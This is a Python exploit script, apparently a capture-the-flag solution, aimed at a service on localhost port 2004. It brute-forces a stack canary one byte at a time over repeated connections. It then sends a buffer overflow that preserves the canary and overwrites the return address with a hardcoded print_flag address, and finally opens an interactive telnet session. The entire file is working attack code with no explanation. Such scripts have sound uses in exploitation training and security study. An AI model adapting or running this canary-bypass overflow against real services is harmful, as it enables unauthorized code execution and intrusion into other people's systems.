#!/usr/bin/python3

import socket
import telnetlib

def read_output(s):
     while True:
        data = s.recv(2048).decode('ASCII')
        if "analyzed?" in data:
            return True
        elif "255" in data:
            return False

def determine_stack_canary():
    print('starting stack canary extraction...')
    canary = b''
    for j in range(8):
        current_byte = 0x00
        for i in range (0,256):
            s = socket.create_connection(('localhost', 2004))
            s.recv(2048).decode('ASCII')
            s.send(str(bytes_to_canary + 1 + j).encode() + b"\n")
            s.recv(2048).decode('ASCII')
            s.send(b"A"*(bytes_to_canary) + canary + current_byte.to_bytes(1, 'little'))

            if read_output(s):
                print(f"Canary byte found, byte is {current_byte}")
                canary += current_byte.to_bytes(1, 'little')
                break
            else:
                current_byte += 1
            
            s.close()
    return canary

bytes_to_canary = 1032
print_flag_address = 0x00402f45

canary = determine_stack_canary()
print(canary)

s = socket.create_connection(('localhost', 2004))
s.recv(2048).decode('ASCII')
s.send(str(bytes_to_canary+40).encode() +  b"\n")
s.recv(2048).decode('ASCII')
s.send(b"A"*bytes_to_canary + canary + b"A"*24 + print_flag_address.to_bytes(8, 'little'))

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()

